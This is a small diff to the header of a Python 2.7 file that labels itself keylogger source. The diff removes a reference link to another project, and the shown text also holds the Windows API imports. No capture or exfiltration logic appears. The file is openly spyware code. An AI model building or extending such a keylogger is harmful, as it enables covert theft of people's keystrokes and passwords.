@@ -1,6 +1,5 @@
 '''
 Keylogger source, Python 2.7
-Referenced from my other project: https://github.com/xp4xbox/Puffader
 '''
 import time, os, threading, sys
 import win32console, win32gui, win32event, win32api, winerror
